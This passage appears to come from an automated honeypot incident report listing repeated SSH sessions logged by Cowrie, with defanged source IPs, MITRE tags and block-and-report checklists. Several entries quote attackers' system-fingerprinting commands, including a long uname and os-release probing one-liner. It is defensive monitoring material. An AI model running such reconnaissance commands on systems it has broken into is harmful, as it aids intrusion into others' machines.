| `2026-09-05 17:47:58` | `cowrie.client.kex` |
| `2026-09-05 17:47:58` | `cowrie.login.success` |
| `2026-09-05 17:47:59` | `cowrie.session.params` |
| `2026-09-05 17:47:59` | `cowrie.command.input` |
| `2026-09-05 17:47:59` | `cowrie.log.closed` |
| `2026-09-05 17:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6bb31521daa

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:48 |
| **Last Seen** | 2026-09-05 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:48:12` | `cowrie.session.connect` |
| `2026-09-05 17:48:12` | `cowrie.client.version` |
| `2026-09-05 17:48:13` | `cowrie.client.kex` |
| `2026-09-05 17:48:13` | `cowrie.login.success` |
| `2026-09-05 17:48:13` | `cowrie.session.params` |
| `2026-09-05 17:48:13` | `cowrie.command.input` |
| `2026-09-05 17:48:13` | `cowrie.log.closed` |
| `2026-09-05 17:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782205fb18f2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:48 |
| **Last Seen** | 2026-09-05 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:48:27` | `cowrie.session.connect` |
| `2026-09-05 17:48:27` | `cowrie.client.version` |
| `2026-09-05 17:48:27` | `cowrie.client.kex` |
| `2026-09-05 17:48:27` | `cowrie.login.success` |
| `2026-09-05 17:48:28` | `cowrie.session.params` |
| `2026-09-05 17:48:28` | `cowrie.command.input` |
| `2026-09-05 17:48:28` | `cowrie.log.closed` |
| `2026-09-05 17:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f39b4296c106

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:48 |
| **Last Seen** | 2026-09-05 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:48:42` | `cowrie.session.connect` |
| `2026-09-05 17:48:42` | `cowrie.client.version` |
| `2026-09-05 17:48:42` | `cowrie.client.kex` |
| `2026-09-05 17:48:42` | `cowrie.login.success` |
| `2026-09-05 17:48:42` | `cowrie.session.params` |
| `2026-09-05 17:48:42` | `cowrie.command.input` |
| `2026-09-05 17:48:42` | `cowrie.log.closed` |
| `2026-09-05 17:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e523ebc7c77

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:48 |
| **Last Seen** | 2026-09-05 17:49 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:48:52` | `cowrie.session.connect` |
| `2026-09-05 17:48:52` | `cowrie.client.version` |
| `2026-09-05 17:48:52` | `cowrie.client.kex` |
| `2026-09-05 17:48:57` | `cowrie.login.success` |
| `2026-09-05 17:49:01` | `cowrie.session.params` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.success` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:01` | `cowrie.command.input` |
| `2026-09-05 17:49:05` | `cowrie.log.closed` |
| `2026-09-05 17:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78daa497392e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:48 |
| **Last Seen** | 2026-09-05 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:48:56` | `cowrie.session.connect` |
| `2026-09-05 17:48:56` | `cowrie.client.version` |
| `2026-09-05 17:48:56` | `cowrie.client.kex` |
| `2026-09-05 17:48:56` | `cowrie.login.success` |
| `2026-09-05 17:48:57` | `cowrie.session.params` |
| `2026-09-05 17:48:57` | `cowrie.command.input` |
| `2026-09-05 17:48:57` | `cowrie.log.closed` |
| `2026-09-05 17:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89267744fef8

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:49 |
| **Last Seen** | 2026-09-05 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:49:10` | `cowrie.session.connect` |
| `2026-09-05 17:49:10` | `cowrie.client.version` |
| `2026-09-05 17:49:10` | `cowrie.client.kex` |
| `2026-09-05 17:49:10` | `cowrie.login.success` |
| `2026-09-05 17:49:11` | `cowrie.session.params` |
| `2026-09-05 17:49:11` | `cowrie.command.input` |
| `2026-09-05 17:49:11` | `cowrie.log.closed` |
| `2026-09-05 17:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e653456861c4

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:49 |
| **Last Seen** | 2026-09-05 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:49:25` | `cowrie.session.connect` |
| `2026-09-05 17:49:25` | `cowrie.client.version` |
| `2026-09-05 17:49:25` | `cowrie.client.kex` |
| `2026-09-05 17:49:25` | `cowrie.login.success` |
| `2026-09-05 17:49:25` | `cowrie.session.params` |
| `2026-09-05 17:49:25` | `cowrie.command.input` |
| `2026-09-05 17:49:25` | `cowrie.log.closed` |
| `2026-09-05 17:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dedea1ff4d7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:49 |
| **Last Seen** | 2026-09-05 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:49:39` | `cowrie.session.connect` |
| `2026-09-05 17:49:39` | `cowrie.client.version` |
| `2026-09-05 17:49:39` | `cowrie.client.kex` |
| `2026-09-05 17:49:39` | `cowrie.login.success` |
| `2026-09-05 17:49:40` | `cowrie.session.params` |
| `2026-09-05 17:49:40` | `cowrie.command.input` |
| `2026-09-05 17:49:40` | `cowrie.log.closed` |
| `2026-09-05 17:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-582b81ea79fb

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:49 |
| **Last Seen** | 2026-09-05 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:49:53` | `cowrie.session.connect` |
| `2026-09-05 17:49:53` | `cowrie.client.version` |
| `2026-09-05 17:49:53` | `cowrie.client.kex` |
| `2026-09-05 17:49:53` | `cowrie.login.success` |
| `2026-09-05 17:49:54` | `cowrie.session.params` |
| `2026-09-05 17:49:54` | `cowrie.command.input` |
| `2026-09-05 17:49:54` | `cowrie.log.closed` |
| `2026-09-05 17:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37d752a17996

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:50 |
| **Last Seen** | 2026-09-05 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:50:07` | `cowrie.session.connect` |
| `2026-09-05 17:50:07` | `cowrie.client.version` |
| `2026-09-05 17:50:07` | `cowrie.client.kex` |
| `2026-09-05 17:50:08` | `cowrie.login.success` |
| `2026-09-05 17:50:08` | `cowrie.session.params` |
| `2026-09-05 17:50:08` | `cowrie.command.input` |
| `2026-09-05 17:50:08` | `cowrie.log.closed` |
| `2026-09-05 17:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900af51d5654

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:50 |
| **Last Seen** | 2026-09-05 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:50:21` | `cowrie.session.connect` |
| `2026-09-05 17:50:21` | `cowrie.client.version` |
| `2026-09-05 17:50:21` | `cowrie.client.kex` |
| `2026-09-05 17:50:22` | `cowrie.login.success` |
| `2026-09-05 17:50:22` | `cowrie.session.params` |
| `2026-09-05 17:50:22` | `cowrie.command.input` |
| `2026-09-05 17:50:22` | `cowrie.log.closed` |
| `2026-09-05 17:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee8cc6b3a788

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:50 |
| **Last Seen** | 2026-09-05 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:50:36` | `cowrie.session.connect` |
| `2026-09-05 17:50:36` | `cowrie.client.version` |
| `2026-09-05 17:50:36` | `cowrie.client.kex` |
| `2026-09-05 17:50:36` | `cowrie.login.success` |
| `2026-09-05 17:50:36` | `cowrie.session.params` |
| `2026-09-05 17:50:36` | `cowrie.command.input` |
| `2026-09-05 17:50:36` | `cowrie.log.closed` |
| `2026-09-05 17:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7bc43754d2a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:50 |
| **Last Seen** | 2026-09-05 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:50:50` | `cowrie.session.connect` |
| `2026-09-05 17:50:50` | `cowrie.client.version` |
| `2026-09-05 17:50:50` | `cowrie.client.kex` |
| `2026-09-05 17:50:50` | `cowrie.login.success` |
| `2026-09-05 17:50:51` | `cowrie.session.params` |
| `2026-09-05 17:50:51` | `cowrie.command.input` |
| `2026-09-05 17:50:51` | `cowrie.log.closed` |
| `2026-09-05 17:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-add82bc69423

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:51 |
| **Last Seen** | 2026-09-05 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:51:04` | `cowrie.session.connect` |
| `2026-09-05 17:51:04` | `cowrie.client.version` |
| `2026-09-05 17:51:04` | `cowrie.client.kex` |
| `2026-09-05 17:51:04` | `cowrie.login.success` |
| `2026-09-05 17:51:05` | `cowrie.session.params` |
| `2026-09-05 17:51:05` | `cowrie.command.input` |
| `2026-09-05 17:51:05` | `cowrie.log.closed` |
| `2026-09-05 17:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0bbb1cb947

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:51 |
| **Last Seen** | 2026-09-05 17:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:51:17` | `cowrie.session.connect` |
| `2026-09-05 17:51:18` | `cowrie.client.version` |
| `2026-09-05 17:51:18` | `cowrie.client.kex` |
| `2026-09-05 17:51:23` | `cowrie.login.success` |
| `2026-09-05 17:51:26` | `cowrie.session.params` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.success` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:26` | `cowrie.command.input` |
| `2026-09-05 17:51:28` | `cowrie.log.closed` |
| `2026-09-05 17:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c8206f64ff

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:51 |
| **Last Seen** | 2026-09-05 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:51:18` | `cowrie.session.connect` |
| `2026-09-05 17:51:18` | `cowrie.client.version` |
| `2026-09-05 17:51:18` | `cowrie.client.kex` |
| `2026-09-05 17:51:18` | `cowrie.login.success` |
| `2026-09-05 17:51:19` | `cowrie.session.params` |
| `2026-09-05 17:51:19` | `cowrie.command.input` |
| `2026-09-05 17:51:19` | `cowrie.log.closed` |
| `2026-09-05 17:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85d43d1ce7a6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:51 |
| **Last Seen** | 2026-09-05 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:51:33` | `cowrie.session.connect` |
| `2026-09-05 17:51:33` | `cowrie.client.version` |
| `2026-09-05 17:51:33` | `cowrie.client.kex` |
| `2026-09-05 17:51:33` | `cowrie.login.success` |
| `2026-09-05 17:51:33` | `cowrie.session.params` |
| `2026-09-05 17:51:33` | `cowrie.command.input` |
| `2026-09-05 17:51:33` | `cowrie.log.closed` |
| `2026-09-05 17:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496f0e716cd7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:51 |
| **Last Seen** | 2026-09-05 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:51:47` | `cowrie.session.connect` |
| `2026-09-05 17:51:47` | `cowrie.client.version` |
| `2026-09-05 17:51:47` | `cowrie.client.kex` |
| `2026-09-05 17:51:47` | `cowrie.login.success` |
| `2026-09-05 17:51:48` | `cowrie.session.params` |
| `2026-09-05 17:51:48` | `cowrie.command.input` |
| `2026-09-05 17:51:48` | `cowrie.log.closed` |
| `2026-09-05 17:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec9bd5511eac

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:52 |
| **Last Seen** | 2026-09-05 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:52:02` | `cowrie.session.connect` |
| `2026-09-05 17:52:02` | `cowrie.client.version` |
| `2026-09-05 17:52:02` | `cowrie.client.kex` |
| `2026-09-05 17:52:02` | `cowrie.login.success` |
| `2026-09-05 17:52:02` | `cowrie.session.params` |
| `2026-09-05 17:52:02` | `cowrie.command.input` |
| `2026-09-05 17:52:02` | `cowrie.log.closed` |
| `2026-09-05 17:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49dfed70f0c7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:52 |
| **Last Seen** | 2026-09-05 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:52:16` | `cowrie.session.connect` |
| `2026-09-05 17:52:16` | `cowrie.client.version` |
| `2026-09-05 17:52:16` | `cowrie.client.kex` |
| `2026-09-05 17:52:16` | `cowrie.login.success` |
| `2026-09-05 17:52:17` | `cowrie.session.params` |
| `2026-09-05 17:52:17` | `cowrie.command.input` |
| `2026-09-05 17:52:17` | `cowrie.log.closed` |
| `2026-09-05 17:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6689f049dd1b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:52 |
| **Last Seen** | 2026-09-05 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:52:30` | `cowrie.session.connect` |
| `2026-09-05 17:52:30` | `cowrie.client.version` |
| `2026-09-05 17:52:30` | `cowrie.client.kex` |
| `2026-09-05 17:52:31` | `cowrie.login.success` |
| `2026-09-05 17:52:31` | `cowrie.session.params` |
| `2026-09-05 17:52:31` | `cowrie.command.input` |
| `2026-09-05 17:52:31` | `cowrie.log.closed` |
| `2026-09-05 17:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-651d94427188

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:52 |
| **Last Seen** | 2026-09-05 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:52:45` | `cowrie.session.connect` |
| `2026-09-05 17:52:45` | `cowrie.client.version` |
| `2026-09-05 17:52:45` | `cowrie.client.kex` |
| `2026-09-05 17:52:45` | `cowrie.login.success` |
| `2026-09-05 17:52:46` | `cowrie.session.params` |
| `2026-09-05 17:52:46` | `cowrie.command.input` |
| `2026-09-05 17:52:46` | `cowrie.log.closed` |
| `2026-09-05 17:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af1c0413bb6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:53 |
| **Last Seen** | 2026-09-05 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:53:00` | `cowrie.session.connect` |
| `2026-09-05 17:53:00` | `cowrie.client.version` |
| `2026-09-05 17:53:00` | `cowrie.client.kex` |
| `2026-09-05 17:53:00` | `cowrie.login.success` |
| `2026-09-05 17:53:01` | `cowrie.session.params` |
| `2026-09-05 17:53:01` | `cowrie.command.input` |
| `2026-09-05 17:53:01` | `cowrie.log.closed` |
